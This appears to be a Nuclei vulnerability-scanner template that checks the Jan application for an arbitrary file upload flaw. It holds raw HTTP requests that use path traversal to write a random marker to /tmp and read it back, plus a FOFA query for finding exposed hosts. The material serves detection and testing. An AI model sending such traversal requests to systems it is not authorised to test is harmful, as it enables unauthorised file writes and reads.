http:
- matchers:
  - part: body_2
    type: word
    words:
    - '{{randstr}}'
  - part: content_type_2
    type: word
    words:
    - text/plain
  matchers-condition: and
  raw:
  - 'POST /v1/app/writeFileSync HTTP/1.1

    Host: {{Hostname}}

    contentType: application/json

    Content-Type: text/plain;charset=UTF-8

    Origin: {{RootURL}}


    ["/../../../../../tmp/{{string}}.txt","{{randstr}}"]

    '
  - 'POST /v1/app/readFileSync HTTP/1.1

    Host: {{Hostname}}

    contentType: application/json

    Content-Type: text/plain;charset=UTF-8

    Origin: {{RootURL}}


    ["file:/../../../../../tmp/{{string}}.txt","utf-8"]

    '
id: jan-file-upload
info:
  author: pussycat0x
  description: 'Jan''s API interface writeFileSync and appendFileSync does not filter
    parameters, resulting in an arbitrary file upload vulnerability.

    '
  metadata:
    fofa-query: icon_hash="-165268926"
    max-request: 2
  name: Jan - Arbitrary File Upload
  reference:
  - https://github.com/wy876/POC/blob/main/Jan%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  - https://github.com/HackAllSec/CVEs/blob/81e63ae5caae40be47905adae601e0c2f480190b/Jan%20Arbitrary%20File%20Upload%20vulnerability/README.md
  severity: high
  tags: jan,intrusive,file-upload
variables:
  string: '{{to_lower(rand_base(5))}}'
